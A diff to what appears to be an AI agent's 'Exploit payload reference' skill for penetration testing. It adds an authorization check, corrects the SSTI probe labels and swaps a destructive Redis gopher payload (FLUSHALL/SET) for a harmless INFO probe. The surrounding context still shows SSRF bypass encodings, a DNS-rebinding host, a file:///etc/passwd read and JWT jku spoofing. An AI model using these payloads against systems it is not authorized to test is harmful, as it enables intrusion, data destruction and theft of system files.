@@ -5,6 +5,8 @@ description: Use when you need a specific exploit payload — XSS, SQLi, SSTI, S
 
 # Exploit payload reference
 
+Authorized targets only: run `authorization-gate` first and prefer non-destructive probes.
+
 PayloadsAllTheThings + SecLists are cloned locally — see `security-wordlists` skill for paths. This skill gives you the most useful payloads inline and points to the right cheatsheet for depth.
 
 ## XSS
@@ -59,8 +61,9 @@ For complex cases use `sqlmap`. Cheatsheet: `/opt/PayloadsAllTheThings/SQL Injec
 {{7*7}}                  # Jinja2 / Twig: 49
 ${7*7}                   # FreeMarker / Velocity / SpEL
 <%= 7*7 %>               # ERB / EJS
-#{7*7}                   # Ruby / Smarty
-${{7*7}}                 # Handlebars: literal
+#{7*7}                   # Ruby / Pug interpolation
+{$smarty.version}        # Smarty
+${{7*7}}                 # polyglot: 49 in Twig/Jinja2, literal elsewhere
 @{7*7}                   # Razor
 
 # Jinja2 RCE
@@ -99,7 +102,7 @@ http://0x7f000001              # hex
 http://7f000001.rbndr.us/
 
 # Gopher (raw TCP)
-gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20pwn
+gopher://127.0.0.1:6379/_INFO%0d%0a   # harmless probe; never FLUSHALL or SET on a live service
 
 # File scheme
 file:///etc/passwd
@@ -183,4 +186,4 @@ jwt_tool $TOKEN -X jku             # jku spoofing
 
 ## When in doubt
 
-`${GITHUB_TOOL_DIR:-/opt}/PayloadsAllTheThings/<vuln>/README.md` is the canonical cheatsheet — `/opt/...` on Linux, `~/tools/...` on Termux. Open that file; it updates faster than any inline list.
+`PayloadsAllTheThings/<vuln>/README.md` is the canonical cheatsheet, under `$GITHUB_TOOL_DIR` if set, else `/opt` (Linux) or `~/tools` (Termux); see `security-wordlists` for the probe. Open that file; it updates faster than any inline list.
